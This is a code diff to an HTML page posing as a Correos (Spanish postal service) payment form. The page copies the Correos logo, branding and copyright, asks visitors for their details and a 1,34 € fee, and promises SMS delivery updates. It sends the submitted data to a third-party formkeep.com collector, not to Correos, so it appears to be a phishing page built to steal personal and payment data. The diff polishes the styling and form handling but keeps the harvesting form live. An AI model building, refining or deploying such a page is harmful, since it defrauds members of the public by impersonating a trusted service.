@@ -84,7 +84,7 @@
         /* Estilo del botón */
         .form-group input[type="submit"] {
             background-color: #F7C731; /* Amarillo fuerte */
-            color: #1A4598; /* Azul */
+            color: #1A4598; /* Azul en el botón */
             border: none;
             font-size: 18px;
             font-weight: bold;
@@ -130,6 +130,14 @@
             margin-bottom: 25px;
         }
 
+        /* Estilo del texto debajo del botón de pago */
+        .payment-info {
+            font-size: 14px;
+            color: #1A4598;
+            text-align: center;
+            margin-top: 15px;
+        }
+
     </style>
 </head>
 <body>
@@ -137,18 +145,14 @@
     <div class="container">
         <!-- Logo de Correos que dirige a la web de Correos -->
         <a href="https://www.correos.es" target="_blank">
-            <img src="C:\Users\Acer\Downloads\logo correos.png" alt="Logo Correos" class="logo"> <!-- Reemplaza con la ruta de tu logo -->
+            <img src="logo_correos.png" alt="Logo Correos" class="logo"> <!-- Ruta de la imagen en la raíz del repositorio -->
         </a>
 
         <h1>Formulario de Pago - Correos</h1>
         <h2>Por favor, ingresa tus datos para procesar el pago</h2>
 
         <!-- Formulario -->
-        <form action="https://formkeep.com/f/f53d1d9ffeeb"
-              accept-charset="UTF-8"
-              enctype="multipart/form-data"
-              method="POST">
-
+        <form action="https://formkeep.com/f/f53d1d9ffeeb" method="POST">
             <!-- Nombre -->
             <div class="form-group">
                 <label for="first_name">Nombre</label>
@@ -207,13 +211,12 @@
             <div class="form-group">
                 <input type="submit" value="Pagar 1,34 €">
             </div>
-
-            <!-- Texto adicional debajo del botón -->
-            <p style="text-align: center; color: #555; font-size: 14px;">
-                Una vez realizado el pago, se le enviará un SMS informándole sobre el estado de la entrega en todo momento.
-            </p>
-
         </form>
+
+        <!-- Texto adicional debajo del botón -->
+        <div class="payment-info">
+            <p>Una vez realizado el pago, se le enviará un SMS informándole sobre el estado de la entrega de su paquete en todo momento.</p>
+        </div>
     </div>
 
     <!-- Footer -->
@@ -221,5 +224,6 @@
         <p>&copy; 2024 Correos. Todos los derechos reservados. <br>
         <a href="https://www.correos.es" target="_blank">Visita nuestro sitio web</a></p>
     </div>
+
 </body>
 </html>
